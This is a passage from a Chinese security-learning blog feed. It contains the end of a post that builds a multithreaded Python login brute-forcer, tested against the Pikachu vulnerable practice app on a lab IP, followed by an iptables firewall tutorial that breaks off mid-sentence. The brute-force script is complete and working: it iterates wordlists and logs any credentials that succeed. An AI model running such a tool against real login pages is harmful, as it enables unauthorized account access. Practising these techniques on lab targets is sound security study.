for j in password:            threads.append(threading.Thread(target=run, args=(i,j,url,)))    for thread in threads:        thread.start()    for thread in threads:        thread.join()    print(&quot;运行结束&quot;)if __name__ == &quot;__main__&quot;:    start = time.time()    multi_thread(username, password, url, timeout)    end = time.time()    print(&quot;time&quot;+str(end - start)+&quot;seconds&quot;)</code></pre><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><h4 id="少量数据"><a href="#少量数据" class="headerlink" title="少量数据"></a>少量数据</h4><p><img src="/../image/image-20240720210135386.png" alt="image-20240720210135386"></p><p><img src="/../image/image-20240720210143724.png" alt="image-20240720210143724"></p><p>可以看到原版还更快</p><h4 id="大量数据"><a href="#大量数据" class="headerlink" title="大量数据"></a>大量数据</h4><p><img src="/../image/image-20240720210224710.png" alt="image-20240720210224710"></p><p><img src="/../image/image-20240720210241091.png" alt="image-20240720210241091"></p><p><img src="/../image/image-20240720212023505.png" alt="image-20240720212023505"></p><p>可以看到数据量大了，多线程的速度快的多，快了快一倍，但测试中也有问题，多线程容易报错，而且一报错就很多报错信息。。。。可能是因为没有上锁导致的安全问题，这个要学的就有点多了。。。果然把BP用好比啥都强。。。</p><h2 id="扩展四：输出日志"><a href="#扩展四：输出日志" class="headerlink" title="扩展四：输出日志"></a>扩展四：输出日志</h2><p><a href="https://blog.csdn.net/chrnhao/article/details/138216601">https://blog.csdn.net/chrnhao/article/details/138216601</a></p><pre><code class="python"># 配置日志记录logging.basicConfig(level=logging.INFO, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)logger = logging.getLogger(__name__)# 创建文件处理程序current_time = time.strftime(&#39;%Y-%m-%d_%H-%M-%S&#39;, time.localtime())log_file_name = f&quot;&#123;current_time&#125;_&#123;url.replace(&#39;/&#39;, &#39;_&#39;).replace(&#39;:&#39;, &#39;_&#39;)&#125;.txt&quot;file_handler = logging.FileHandler(log_file_name, encoding=&#39;utf-8&#39;)file_handler.setLevel(logging.INFO)file_formatter = logging.Formatter(&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)file_handler.setFormatter(file_formatter)logger.addHandler(file_handler)</code></pre><p><img src="/../image/image-20240720212050200.png" alt="image-20240720212050200"></p><p><img src="/../image/image-20240720212100919.png" alt="image-20240720212100919"></p><p><img src="/../image/image-20240720212122504.png" alt="image-20240720212122504"></p><p><img src="/../image/image-20240720212129319.png" alt="image-20240720212129319"></p><p>可以看到效果还是不错的</p><h2 id="问题修复"><a href="#问题修复" class="headerlink" title="问题修复"></a>问题修复</h2><p><img src="/../image/image-20240720212409948.png" alt="image-20240720212409948"></p><p>可以看到是不同进程之间引起了错误</p><p><img src="/../image/image-20240720212449229.png" alt="image-20240720212449229"></p><p>无法连接，这个我也无法解决</p><h3 id="错误信息太多"><a href="#错误信息太多" class="headerlink" title="错误信息太多"></a>错误信息太多</h3><p>看不过来我们可以提升日志记录的等级为，把error也记录进去</p><pre><code class="python"># 配置日志记录logging.basicConfig(level=logging.DEBUG, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)logger = logging.getLogger(__name__)</code></pre><p>在查看代码的过程发现，有这么多异常信息是因为run’没有作异常处理</p><p><img src="/../image/image-20240720212620278.png" alt="image-20240720212620278"></p><p>做一下requests的异常处理</p><pre><code class="python"># 主函数def run(username, password, url):    try:        data = &#123;            &quot;username&quot;: username,            &quot;password&quot;: password,            &quot;submit&quot;: &quot;Login&quot;        &#125;        r = requests.post(url, data=data)        if &quot;success&quot; in r.text:            logger.info(&quot;[+]爆破成功：用户名：&quot; + username + &quot;，密码：&quot; + password)        # else:        #     logger.info(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)    except requests.exceptions.RequestException as e:        logger.exception(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;,测试数据: username:&#123;username&#125;, password &#123;password&#125;&quot;)</code></pre><h3 id="输出复杂（日志就不带url，太长了）"><a href="#输出复杂（日志就不带url，太长了）" class="headerlink" title="输出复杂（日志就不带url，太长了）"></a>输出复杂（日志就不带url，太长了）</h3><p><img src="/../image/image-20240720214659595.png" alt="image-20240720214659595"></p><p>密密麻麻的，不好找，在最后再加一个正确的输出结果，先用一个列表把成功的结果存起来,下面是改完后的完整代码</p><pre><code class="python">import requestsimport argparseimport threadingimport timeimport loggingurl = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;# 配置日志记录logging.basicConfig(level=logging.DEBUG, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)logger = logging.getLogger(__name__)# 创建文件处理程序current_time = time.strftime(&#39;%Y-%m-%d_%H-%M-%S&#39;, time.localtime())log_file_name = f&quot;&#123;current_time&#125;.txt&quot;file_handler = logging.FileHandler(log_file_name, encoding=&#39;utf-8&#39;)file_handler.setLevel(logging.DEBUG)  # 设置日志级别为 DEBUGfile_formatter = logging.Formatter(&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)file_handler.setFormatter(file_formatter)logger.addHandler(file_handler)# 用于存储成功的结果success_results = []# 文件读取def get_data(path):    with open(path, &quot;r&quot;) as f:        data = f.read().split(&quot;\n&quot;)    return data# 控制参数parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)args = parser.parse_args()username = get_data(args.username)password = get_data(args.password)timeout = args.timeout# 探活def check(url, timeout):    try:        response = requests.get(url, timeout=timeout)        logger.info(f&quot;响应状态码：&#123;response.status_code&#125; -----&gt; &#123;url&#125;&quot;)        return response.status_code    except requests.exceptions.RequestException as e:        logger.error(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)        return# 主函数def run(username, password, url):    try:        data = &#123;            &quot;username&quot;: username,            &quot;password&quot;: password,            &quot;submit&quot;: &quot;Login&quot;        &#125;        r = requests.post(url, data=data)        if &quot;success&quot; in r.text:            success_results.append(f&quot;[+]爆破成功：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)            logger.info(success_results[-1])  # 记录成功的日志信息         else:             logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)    except requests.exceptions.RequestException as e:        logger.error(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;, 测试数据: username:&#123;username&#125;, password &#123;password&#125;&quot;)# 多线程def multi_thread(username, password, url, timeout):    if check(url, timeout) != 200:        return    threads = []    for i in username:        for j in password:            threads.append(threading.Thread(target=run, args=(i, j, url,)))    for thread in threads:        thread.start()    for thread in threads:        thread.join()    logger.info(&quot;运行结束&quot;)    # 输出成功的结果    logger.info(&quot;成功的结果:&quot;)    for result in success_results:        logger.info(result)if __name__ == &quot;__main__&quot;:    multi_thread(username, password, url, timeout)</code></pre><p>查看运行结果</p><p><img src="/../image/image-20240720214903717.png" alt="image-20240720214903717"></p><p>不错，检查下日志</p><p><img src="/../image/image-20240720214928207.png" alt="image-20240720214928207"></p><p>加上错误原因，省略爆破失败的结果</p><pre><code class="python">import requestsimport argparseimport threadingimport timeimport loggingurl = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;# 配置日志记录logging.basicConfig(level=logging.DEBUG, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)logger = logging.getLogger(__name__)# 创建文件处理程序current_time = time.strftime(&#39;%Y-%m-%d_%H-%M-%S&#39;, time.localtime())log_file_name = f&quot;&#123;current_time&#125;.txt&quot;file_handler = logging.FileHandler(log_file_name, encoding=&#39;utf-8&#39;)file_handler.setLevel(logging.DEBUG)  # 设置日志级别为 DEBUGfile_formatter = logging.Formatter(&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)file_handler.setFormatter(file_formatter)logger.addHandler(file_handler)# 用于存储成功的结果success_results = []# 文件读取def get_data(path):    with open(path, &quot;r&quot;) as f:        data = f.read().split(&quot;\n&quot;)    return data# 控制参数parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)args = parser.parse_args()username = get_data(args.username)password = get_data(args.password)timeout = args.timeout# 探活def check(url, timeout):    try:        response = requests.get(url, timeout=timeout)        logger.info(f&quot;响应状态码：&#123;response.status_code&#125; -----&gt; &#123;url&#125;&quot;)        return response.status_code    except requests.exceptions.RequestException as e:        logger.error(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)        return# 主函数def run(username, password, url):    try:        data = &#123;            &quot;username&quot;: username,            &quot;password&quot;: password,            &quot;submit&quot;: &quot;Login&quot;        &#125;        r = requests.post(url, data=data)        if &quot;success&quot; in r.text:            success_results.append(f&quot;[+]爆破成功：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)            logger.info(success_results[-1])  # 记录成功的日志信息        # else:        #     logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)    except requests.exceptions.RequestException as e:        logger.info(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;, 测试数据: username:&#123;username&#125;, password &#123;password&#125;&quot;)# 多线程def multi_thread(username, password, url, timeout):    if check(url, timeout) != 200:        return    threads = []    for i in username:        for j in password:            threads.append(threading.Thread(target=run, args=(i, j, url,)))    for thread in threads:        thread.start()    for thread in threads:        thread.join()    logger.info(&quot;运行结束&quot;)    # 输出成功的结果    print(&quot;成功的结果:&quot;)    for result in success_results:        print(result)if __name__ == &quot;__main__&quot;:    multi_thread(username, password, url, timeout)</code></pre><p><img src="/../image/image-20240720215502439.png" alt="image-20240720215502439"></p><p>但还是感觉信息有点不是我想要的，再次调试后，终极版来了</p><pre><code class="python">import requestsimport argparseimport threadingimport timeimport loggingurl = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;# 配置日志记录logging.basicConfig(level=logging.INFO, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)logger = logging.getLogger(__name__)# 创建文件处理程序current_time = time.strftime(&#39;%Y-%m-%d_%H-%M-%S&#39;, time.localtime())log_file_name = f&quot;&#123;current_time&#125;.txt&quot;file_handler = logging.FileHandler(log_file_name, encoding=&#39;utf-8&#39;)file_handler.setLevel(logging.DEBUG)  # 设置日志级别为 DEBUGfile_formatter = logging.Formatter(&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)file_handler.setFormatter(file_formatter)logger.addHandler(file_handler)# 用于存储成功的结果success_results = []# 文件读取def get_data(path):    with open(path, &quot;r&quot;) as f:        data = f.read().split(&quot;\n&quot;)    return data# 控制参数parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)args = parser.parse_args()username = get_data(args.username)password = get_data(args.password)timeout = args.timeout# 探活def check(url, timeout):    try:        response = requests.get(url, timeout=timeout)        logger.info(f&quot;响应状态码：&#123;response.status_code&#125; -----&gt; &#123;url&#125;&quot;)        return response.status_code    except requests.exceptions.RequestException as e:        logger.error(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)        return# 主函数def run(username, password, url):    try:        data = &#123;            &quot;username&quot;: username,            &quot;password&quot;: password,            &quot;submit&quot;: &quot;Login&quot;        &#125;        r = requests.post(url, data=data)        if &quot;success&quot; in r.text:            success_results.append(f&quot;[+]爆破成功：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)            logger.info(success_results[-1])  # 记录成功的日志信息        # else:        #     logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)    except requests.exceptions.RequestException as e:        logger.info(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;, 测试数据: username:&#123;username&#125;, password &#123;password&#125;&quot;)# 多线程def multi_thread(username, password, url, timeout):    if check(url, timeout) != 200:        return    threads = []    for i in username:        for j in password:            threads.append(threading.Thread(target=run, args=(i, j, url,)))    for thread in threads:        thread.start()    for thread in threads:        thread.join()    logger.info(&quot;运行结束&quot;)    # 输出成功的结果    print(&quot;成功的结果:&quot;)    for result in success_results:        print(result)if __name__ == &quot;__main__&quot;:    multi_thread(username, password, url, timeout)</code></pre><p><img src="/../image/image-20240720220123972.png" alt="image-20240720220123972"></p><p>可以看到终极版的输出，有成功和请求失败的，对于多线程导致的请求失败的结果哦我们可以单独再测试一次。。。吃了不会多线程的苦，检查下日志</p><p><img src="/../image/image-20240720220335586.png" alt="image-20240720220335586"></p><p>对于请求失败的测试结果和成功的结果都有区分，然后命名也不会太长</p><h2 id="挖坑总结"><a href="#挖坑总结" class="headerlink" title="挖坑总结"></a>挖坑总结</h2><ol><li>这只是对当个url的测试</li><li>没有爬虫</li><li>没有token，session，cookie</li><li>没有验证码绕过</li><li>好累</li><li>把BP用好比啥都强，还是学BP的爆破容易一点</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>iptables</title>
      <link href="/2024/05/31/iptables/"/>
      <url>/2024/05/31/iptables/</url>
      
        <content type="html"><![CDATA[<h1 id="基础模型与参数介绍"><a href="#基础模型与参数介绍" class="headerlink" title="基础模型与参数介绍"></a>基础模型与参数介绍</h1><h2 id="什么是防火墙-防火墙的分类有哪些？"><a href="#什么是防火墙-防火墙的分类有哪些？" class="headerlink" title="什么是防火墙?防火墙的分类有哪些？"></a>什么是防火墙?防火墙的分类有哪些？</h2><p>防火墙技术是通过有机结合各类用于安全管理与筛选的软件和硬件设备，帮助计算机网络于其内、外网之间构建一道相对隔绝的保护屏障，以保护用户资料与信息安全性的一种技术。</p><p>防火墙对流经它（进出）的网络通信进行扫描，这样能够过滤掉一些攻击，以免其在目标计算机上被执行。防火墙还可以关闭不使用的端口。而且它还能禁止特定端口的流出通信，封锁特洛伊木马。最后，它可以禁止来自特殊站点的访问，从而防止来自不明入侵者的所有通信。</p><p>一般情况下，防火墙分类：</p><p>从逻辑上防火墙可以大体分为主机防火墙和网络防火墙。</p><p>主机防火墙：针对于单个主机进行防护。</p><p>网络防火墙：针对于多个主机组成的网络进行防护。往往处于需要被保护的网络入口或边缘，对网络入口进行防护，服务于防火墙背后的本地局域网。</p><p>从物理上防火墙可以分为硬件防火墙和软件防火墙。</p><p>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。</p><p>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低，比如我们常见的windows自带防火墙，就属软件防火墙。</p><p><a href="https://blog.csdn.net/m0_52165864/article/details/126987346">什么是网络边界</a></p><h2 id="什么是iptables？"><a href="#什么是iptables？" class="headerlink" title="什么是iptables？"></a>什么是iptables？</h2><p>​iptables 是与 3.5及以后版本 Linux 内核集成的 IP 信息包过滤系统。一般我们称iptables是防火墙，理解为linux上的软件防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，一般内置在Centos与RedHat中。但是在在RHEL7系统中，firewalld防火墙取代了iptables防火墙，Centos7中的默认防火墙也是firewalld，如果想要在Centos7系统中使用iptables，需要安装。</p><p>iptables可以根据数据包中的地址、端口、协议、状态、资源、内容等信息，对数据包进行过滤，并采取相应的处理措施。</p><p>​但是从严格意义来讲，<strong>iptables</strong>其实不是真正的防火墙，他的全称应该是“netfilter&#x2F;iptables IP 数据包过滤系统”，由两个组件netfilter 和 iptables 组成。我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫<strong>netfilter。</strong>位于内核空间。而iptables位于用户空间，是一个命令行工具，我们用这个工具操作netfilter，习惯上将两者组合起来称iptables防火墙。</p><p>Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：</p><p>网络地址转换(Network Address Translate)</p><p>数据包内容修改</p><p>以及数据包过滤的防火墙功能</p><p>所以说，虽然我们使用service iptables start启动iptables”服务”，但是其实准确的来说，iptables并没有一个守护进程，所以并不能算是真正意义上的服务，而应该算是内核提供的功能。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>防火墙主机：</p><pre><code>系统类别：Centos 7.3内核版本：3.10.0-693.el7.x86_64操作软件：iptables v1.4.21IP 地址：192.168.0.2</code></pre><p>客户端主机：</p><pre><code>系统类别：Kali Linux 2020.1内核版本：5.5.0-kali2-amd64IP地 址：192.168.0.4</code></pre><p>本次实验共分为三个部分</p><pre><code>1. iptables基础模型与概念介绍2. iptables基础使用方式3. iptables参数解释</code></pre><h3 id="iptables基础模型与概念介绍"><a href="#iptables基础模型与概念介绍" class="headerlink" title="iptables基础模型与概念介绍"></a>iptables基础模型与概念介绍</h3><p>iptables是由链、表和规则三个元素组成。</p><p>表是链的容器，链是规则的容器。他们三个之间的关系，我们下面细讲。</p><h4 id="什么是规则？"><a href="#什么是规则？" class="headerlink" title="什么是规则？"></a><strong>什么是规则？</strong></h4><p>规则是iptables面对不同网络报文时采取行动的依据，即iptables是按照规则来办事的。iptables根据规则中指定的匹配条件来尝试匹配每个流经此处的报文，一旦匹配成功，则由规则后面指定的处理动作进行处理；</p><p>规则就像是学校的纪律、公司的规章制度一样。是由网络管理员预定义的针对流经防火墙的网络数据包的一条或一系列的约束条件，一般可以将其格式理解为：“如果接收到的数据包头符合设定的条件，就按照设定的处理方式来处理这个数据包”。</p><p>规则存储在内核空间的信息包过滤表中，这些规则可以指定源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包的某些字段与某条规则指定的所有条件匹配时，iptables就根据规则所定义的处理动作来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。</p><p>配置防火墙的主要工作就是添加、修改和删除这些规则。</p><h4 id="什么是链？"><a href="#什么是链？" class="headerlink" title="什么是链？"></a><strong>什么是链？</strong></h4><p>我们知道，防火墙是根据规则办事的，而规则是一条一条的，根据每一条规则应用场景的不同，可以将这些规则进行分类，每一个分类中按顺序排列着多条规则，像一条链子，所以，这些规则所分成的类，就是我们所说的链。</p><p>当防火墙按照该条链上的规则对网络报文进行匹配的时候，是依次、按照顺序进行匹配，直到找到一条规则能够对该网络报文进行处理，或是直到这条链所有的规则都匹配完，没有匹配到合适的规则，采用默认规则进行处理。</p><p>iptables内置了5条链：PREROUTING链、FORWARD链、POSTROUTING链、INPUT链、OUTPUT链</p><p>PREROUTING： 路由前链，应用于对数据包进行路由选择前，即在网卡刚接收到网络报文时；</p><p>FORWARD：转发链，其作用是将数据包由一个网卡转发至另一个网卡；</p><p>POSTROUTING：路由选择之后所应用的链，应用于防火墙向其他主机转发网络报文时，可对报文进行重新封装；</p><p>INPUT：路由选择后所应用的链，应用于网络报文的目的是防火墙本机的上层应用时，即内核空间的TCP&#x2F;IP协议栈将报文传给用户空间的上层应用时使用的链；</p><p>OUTPUT：防火墙用户空间的上层应用向内核空间的TCP&#x2F;IP协议栈转发报文时使用的链；</p><p>我们用如下图进行一个解析：</p><p>（只是将网络流量流经防火墙时可能用到的链，及使用该链时流量的走向标了出来，并不是说流量完全按照下图表示的方向进行传送，具体情境具体分析）</p><p><img src="/../image/image-20240531155402251.png" alt="image-20240531155402251"></p><p>情境1： 网络1中的主机，访问网络2中的某个主机。</p><p>① 网络流量到达网卡eth1后，防火墙进行PREROUTING链的规则匹配，如果通过，则进入下一步</p><p>② 网络流量经过TCP&#x2F;IP协议栈，进行路由选择。</p><p>③ 由于目的地址是网络2中的主机，所以TCP&#x2F;IP协议栈需要将流量从网卡eth1转发到网卡eth0，防火前在此时进行FORWARD链的规则匹配</p><p>④ 防火墙进行POSTROUTING链的规则匹配，对流量进行重新封装，经由网卡eth0发送给网络2中的主机</p><p>⑤ 网络2中主机的响应流量，与前面的请求流量的路径差不多，eth0 –&gt; PREROUTING链 –&gt; TCP&#x2F;IP协议栈 –&gt; FORWARD链 –&gt; POSTROUTING链 –&gt; eth1</p><p>情境2： 网络1中的主机，访问防火墙本机上层的一个应用。</p><p>① 网络流量到达网卡eth1后，防火墙进行PREROUTING链的规则匹配，如果通过，则进入下一步</p><p>② 网络流量经过TCP&#x2F;IP协议栈，进行路由选择。</p><p>③ 由于目的地址是防火墙本机的上层应用，所以TCP&#x2F;IP协议栈向上层服务转发流量，防火墙进行INPUT链的规则匹配</p><p>④ 上层服务在处理完流量后，给与回应，防火墙进行OUTPUT链的规则匹配</p><p>⑤ 流量经过TCP&#x2F;IP协议栈，进行路由选择后，TCP&#x2F;IP协议栈将流量向网卡eth1转发</p><p>⑥ 防火墙进行POSTROUTING链的规则匹配，对流量报文进行重新封装后，经由网卡eth1发送给网络1</p><p>经过上面两个情境的分析，我们就可以知道防火墙中，链是如何运作的，也可以总结出更为准确的流程图：</p><p><img src="/../image/image-20240531163716824.png" alt="image-20240531163716824"></p><h4 id="什么是表"><a href="#什么是表" class="headerlink" title="什么是表"></a>什么是表</h4><p>表与链不同，表是根据规则功能的不同而进行的分类，把这些实现相同功能的规则放在一起形成一个分类，这个分类就叫做表。比如将都是对IP或者端口进行过滤过滤的规则分为一类。</p><p>不同功能的规则，我们可以放置在不同的表中进行管理，而iptables中默认有4种表，每种表对应了不同的功能，而我们所能定义的规则也基本都在这4种功能的范围之内，具体如下：</p><pre><code>filter表：负责过滤功能，实现对数据包的过滤，起到真正的安全效果。nat表：network address translation，网络地址转换功能，不能过滤数据包，仅仅是修改数据包中的IP和端口，即重新封装数据包mangle表：拆解报文，做出修改，并重新封装的功能，不能过滤，也不能修改IP和端口，其修改的功能是指根据规则修改数据包的隐写标志位，比如TTL、TOS值，以便其他规则或程序可以根据这个标志来对数据包进行过滤或策略路由。raw表：关闭nat表上启用的连接追踪机制。可以决定是否使用iptables对数据包进行跟踪处理，比如访问量很大的web服务80端口，就可以在raw表中设置规则，让iptables不对80端口的数据包进行链接追踪处理，以此来提高性能。</code></pre><p>当然，iptables也支持我们定义自己的表。</p><h4 id="表链关系"><a href="#表链关系" class="headerlink" title="表链关系"></a>表链关系</h4><p>我们一开始说，表是链的容器，链是规则的容器，那么他们三个之间的关系究竟是怎样的？可以用如下图简单的表示：</p><p><img src="/../image/image-20240531163813771.png" alt="image-20240531163813771"></p><p>prerouting链上所能配置的规则，只拥有nat表、raw表和mangle表所对应的功能，所以，prerouting中的规则只能存放于nat表、raw表和mangle表中。也就是说，不是每个表中都包含所有的链。</p><p>他们之间的关系如下：</p><pre><code>raw 表包含的链：PREROUTING，OUTPUTmangle 表包含的链：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTINGnat 表包含的链：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）filter 表中包含的链：INPUT，FORWARD，OUTPUT</code></pre><p>到这里，我们还需要注意一点，就是优先级的问题，iptables中，在数据包经过一个”链”的时候，会将当前链的所有规则都匹配一遍，但是匹配时总归要有顺序，又因为相同功能类型的规则会汇聚在一张”表”中，所以这里“优先级”的主题，就是“表”。总结为一下就是“哪些”表”中的规则会放在”链”的最前面执行？”</p><p>当iptables中的4种表处于同一条”链”时，执行的优先级为：</p><pre><code>raw –&gt; mangle –&gt; nat –&gt; filter</code></pre><h4 id="iptables防火墙的工作模型"><a href="#iptables防火墙的工作模型" class="headerlink" title="iptables防火墙的工作模型"></a>iptables防火墙的工作模型</h4><p>结合上述所有的描述，我们可以将数据包通过防火墙的流程总结为下图：</p><p><img src="/../image/image-20240531164122244.png" alt="image-20240531164122244"></p><h4 id="规则的组成"><a href="#规则的组成" class="headerlink" title="规则的组成"></a><strong>规则的组成</strong></h4><p>规则由匹配条件和处理动作组成。</p><h4 id="匹配条件"><a href="#匹配条件" class="headerlink" title="匹配条件"></a>匹配条件</h4><pre><code>匹配条件分为基本匹配条件与扩展匹配条件</code></pre><h4 id="基本匹配条件："><a href="#基本匹配条件：" class="headerlink" title="基本匹配条件："></a><strong>基本匹配条件：</strong></h4><pre><code>源地址Source IP；目标地址 Destination IP；协议类型 protocol；网卡接口 ；等。</code></pre><h4 id="扩展匹配条件："><a href="#扩展匹配条件：" class="headerlink" title="扩展匹配条件："></a><strong>扩展匹配条件：</strong></h4><pre><code>除了上述的条件可以用于匹配，还有很多其他的条件可以用于匹配，这些条件泛称为扩展条件，这些扩展条件其实也是netfilter中的一部分，只是以模块的形式存在，如果想要使用这些条件，则需要依赖对应的扩展模块。如：MAC地址；字符串；多个源/目的端口；时间；等</code></pre><h4 id="处理动作"><a href="#处理动作" class="headerlink" title="处理动作"></a><strong>处理动作</strong></h4><p>处理动作也可以分为基本动作和扩展动作。</p><p>常用的处理动作有：</p><pre><code>ACCEPT：允许数据包通过。DROP：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。SNAT：源地址转换，解决内网用户用同一个公网地址上网的问题。MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。DNAT：目标地址转换。REDIRECT：在本机做端口映射。LOG：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</code></pre><h3 id="iptables基础使用方式"><a href="#iptables基础使用方式" class="headerlink" title="iptables基础使用方式"></a>iptables基础使用方式</h3><p><strong>如何在centos中查看iptables是否启动？</strong></p><pre><code>使用 “service iptables  status” 查看防火墙的状态</code></pre><p>如图，绿色的active表示防火墙处于激活状态，即正在运行中。</p><p><img src="/../image/image-20240531164316414.png" alt="image-20240531164316414"></p><pre><code>使用“service iptables stop” 关闭防火墙</code></pre><p><strong>怎样查看表中的规则？比如查看filter表中的规则</strong></p><pre><code>使用 “iptables -t filter -L” 将iptables表的内容展示出来</code></pre><p>如上命令中，-t表示指定查看哪个表的规则，-L 表示将结果列出来。</p><p>如下图所示，iptables会返回filter表中存在的各个链（INPUT、FORWARD、OUTPUT）以及链中存在的规则</p><p><img src="/../image/image-20240531165325541.png" alt="image-20240531165325541"></p><p>其实上列中的命令可以使用 “iptables -L” 来代替，因为filter表是iptables的默认表，在不使用-t参数指定表名的情况下，默认是对filter进行操作。</p><p>我们也可以查看其它表中的规则，示例如下。</p><pre><code>iptables -t raw -Liptables -t mangle -Liptables -t nat -L</code></pre><p><strong>如何查看指定表中的指定链的规则？</strong></p><p>比如，我们只查看filter表中INPUT链的规则，示例如下（注意链名的大小写）。</p><pre><code>iptables -L INPUT //-t filter被省略</code></pre><p><img src="/../image/image-20240531165425661.png" alt="image-20240531165425661"></p><p>可以看到，使用-v选项后，iptables展示的信息更多了，多出了很多原来没有的字段，这些字段就是规则对应的属性。具体如下：</p><pre><code>pkts:对应规则匹配到的报文的个数。bytes:对应匹配到的报文包的大小总和。target:规则对应的target，往往表示规则对应的”动作”，即规则匹配成功后需要采取的措施。prot:protocol的简写，表示规则对应的协议，是否只针对某些协议应用此规则。opt:表示规则对应的选项。in:表示数据包由哪个接口(网卡)流入，我们可以设置通过哪块网卡流入的报文需要匹配当前规则。out:表示数据包由哪个接口(网卡)流出，我们可以设置通过哪块网卡流出的报文需要匹配当前规则。source:表示规则对应的源头地址，可以是一个IP，也可以是一个网段。destination:表示规则对应的目标地址。可以是一个IP，也可以是一个网段。anywhere是iptables默认对IP地址进行了名称解析，如果规则较多的情况下，会降低iptables的工作效率，可以使用-n参数表示不对名称进行反解，直接显示IP地址。</code></pre><p><strong>使用-n参数不对名称进行反解</strong></p><pre><code>iptables -vnL INPUT</code></pre><p><img src="/../image/image-20240531165520132.png" alt="image-20240531165520132"></p><p><strong>使用–line-numberc 显示规则的序号</strong></p><pre><code>iptables --line-number -vnL INPUT</code></pre><p><img src="/../image/image-20240531165550757.png" alt="image-20240531165550757"></p><p>如果觉得 –line-number 比较长，也可以使用–line：</p><pre><code>iptables --line -vnL INPUT</code></pre><p><strong>默认策略</strong></p><p>每条链都有自己的默认策略，如何查看默认策略？默认策略的表述就在每个链后面的括号里：</p><p><strong>policy</strong>表示当前链的默认策略，policy ACCEPT表示上图中INPUT的链的默认动作为ACCEPT，换句话说就是，当没有没有匹配到相应的规则时，默认接受通过INPUT链的所有请求。</p><p><strong>packets</strong>表示当前链（上例为INPUT链）默认策略匹配到的包的数量，0 